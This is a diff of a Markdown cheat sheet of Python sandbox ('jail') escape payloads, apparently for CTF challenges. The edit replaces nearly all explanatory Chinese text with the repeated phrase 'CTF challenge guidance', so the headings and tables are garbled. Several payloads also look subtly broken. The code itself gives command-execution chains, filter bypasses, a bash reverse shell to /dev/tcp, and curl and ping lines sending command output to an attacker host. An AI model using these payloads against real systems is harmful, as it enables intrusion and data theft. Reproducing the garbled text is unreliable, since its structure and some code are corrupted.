@@ -1,28 +1,28 @@
-# Python Jail 逃逸大全
+# Python Jail CTF challenge guidance
 
-## 逃逸决策树
+## CTF challenge guidance
 
 ```
-输入被 eval/exec
-├── 能否 import?
-│   ├── 能 → __import__('os').system('id')
-│   └── 不能 → 找 builtins
-├── 能否访问 __builtins__?
-│   ├── 能 → 利用 __builtins__ 找可用函数
-│   └── 不能 → 找其他引用链
-├── 是否有过滤?
-│   ├── 过滤下划线 → 找无下划线函数
-│   ├── 过滤引号 → 用 StringIO/chr()
-│   └── 过滤方括号 → 用 .format() 或 getattr
-└── 字符限制?
-    ├── 只有字母 → 用 chr() 构造任意字符
-    ├── 长度限制 → 短 payload
-    └── 只允许数字 → 复杂编码
+CTF challenge guidance eval/exec
+├── CTF challenge guidance import 
+│   ├── CTF challenge guidance → __import__('os').system('id')
+│   └── CTF challenge guidance → CTF challenge guidance builtins
+├── CTF challenge guidance __builtins__ 
+│   ├── CTF challenge guidance → CTF challenge guidance __builtins__ CTF challenge guidance
+│   └── CTF challenge guidance → CTF challenge guidance
+├── CTF challenge guidance 
+│   ├── CTF challenge guidance → CTF challenge guidance
+│   ├── CTF challenge guidance → CTF challenge guidance StringIO/chr()
+│   └── CTF challenge guidance → CTF challenge guidance .format() CTF challenge guidance getattr
+└── CTF challenge guidance 
+    ├── CTF challenge guidance → CTF challenge guidance chr() CTF challenge guidance
+    ├── CTF challenge guidance → CTF challenge guidance payload
+    └── CTF challenge guidance → CTF challenge guidance
 ```
 
-## 基础逃逸链
+## CTF challenge guidance
 
-### 1. 直接执行命令
+### 1. CTF challenge guidance
 ```python
 __import__('os').system('id')
 __import__('os').popen('id').read()
@@ -30,100 +30,100 @@ eval("__import__('os').system('id')")
 exec("__import__('os').system('id')")
 ```
 
-### 2. 通过 builtins
+### 2. CTF challenge guidance builtins
 ```python
 __builtins__.__dict__['__import__']('os').system('id')
 getattr(getattr(__builtins__, '__im' + 'port__'), 'os').system('id')
 ```
 
-### 3. 通过 func_globals
+### 3. CTF challenge guidance func_globals
 ```python
 ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('id')
 ```
 
-### 4. 通过 type()
+### 4. CTF challenge guidance type()
 ```python
 type(type(os))
 (type.__subclasses__())
 ```
 
-### 5. 通过 Warning/Exception
+### 5. CTF challenge guidance Warning/Exception
 ```python
 ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').system('id')")
 ```
 
-## 常见子类索引 (print 找索引)
+## CTF challenge guidance (print CTF challenge guidance)
 
 ```python
-# 列出所有可用子类
+# CTF challenge guidance
 print([c.__name__ for c in __builtins__.__dict__.values() if type(c).__name__ == 'type'])
 
-# 或遍历找特定类
+# CTF challenge guidance
 for i, c in enumerate([].__class__.__base__.__subclasses__()):
     print(i, c.__name__)
 ```
 
-## 常用 Gadgets
+## CTF challenge guidance Gadgets
 
-| 类名 | 索引 | 用途 |
+| CTF challenge guidance | CTF challenge guidance | CTF challenge guidance |
 |------|------|------|
-| `catch_warnings` | ~59 | 获取 `__builtins__` |
-| `_io._IOBase` | ~80 | 文件操作 |
-| `Popen` | ~200+ | 命令执行 |
-| `subprocess.Popen` | 动态 | 命令执行 |
+| `catch_warnings` | ~59 | CTF challenge guidance `__builtins__` |
+| `_io._IOBase` | ~80 | CTF challenge guidance |
+| `Popen` | ~200+ | CTF challenge guidance |
+| `subprocess.Popen` | CTF challenge guidance | CTF challenge guidance |
 
-## 绕过过滤
+## CTF challenge guidance
 
-### 下划线被过滤
+### CTF challenge guidance
 ```python
 getattr(getattr(__builtins__, '\x5f\x5fclass\x5f\x5f'), '\x5f\x5f\x5fimport\x5f\x5f')('os').system('id')
 
-# 或用 request 对象（Flask）
+# CTF challenge guidance request CTF challenge guidance（Flask）
 request.environ['werkzeug.server.shutdown']
 ```
 
-### 引号被过滤
+### CTF challenge guidance
 ```python
 chr(95)*2  # '__'
-# 或用 StringIO
+# CTF challenge guidance StringIO
 import('so'[::-1], fromlist=['os']).system('id')
 ```
 
-### 方括号被过滤
+### CTF challenge guidance
 ```python
 getattr(__import__('os'), 'system')('id')
-# 用 .__getattribute__ 代替 getattr
+# CTF challenge guidance .__getattribute__ CTF challenge guidance getattr
 ```
 
-### 数字被过滤
+### CTF challenge guidance
 ```python
-# 用 True/False 构造数字
+# CTF challenge guidance True/False CTF challenge guidance
 True.__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']
 # True = 1, False = 0
 ```
 
-### 长度限制
+### CTF challenge guidance
 ```python
-# 最短的反弹 shell
+# CTF challenge guidance shell
 __import__('os').system('bash -i >& /dev/tcp/IP/PORT 0>&1')
 
-# 或 base64 解码执行
+# CTF challenge guidance base64 CTF challenge guidance
 __import__('base64').b64decode('bWFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDAmPnxkZXYvdGNwL0lQL1BPUlQK').decode()
 ```
 
-## 常见过滤绕过字符集
+## CTF challenge guidance
 
-| 绕过方法 | 适用字符 |
+| CTF challenge guidance | CTF challenge guidance |
 |---------|---------|
-| `chr()` | 所有可见字符 |
-| `hex()` / `oct()` | 数字构造 |
-| `[::-1]` 反转 | `so"[::-1]` = `os` |
-| `+` 拼接 | `'os'[0]+'stem'` |
-| 变量赋值 | `c='o'+'s';__import__(c)` |
+| `chr()` | CTF challenge guidance |
+| `hex()` / `oct()` | CTF challenge guidance |
+| `[::-1]` CTF challenge guidance | `so"[::-1]` = `os` |
+| `+` CTF challenge guidance | `'os'[0]+'stem'` |
+| CTF challenge guidance | `c='o'+'s';__import__(c)` |
 
-## 无回显检测
+## CTF challenge guidance
 ```python
-# 如果命令执行无回显，用以下方式验证
-__import__('os').system('curl http://attacker/?$(id)')
+# CTF challenge guidance，CTF challenge guidance
+__import__('os').system('curl http://attacker/ $(id)')
 __import__('os').system('ping -c1 attacker.com')
 ```
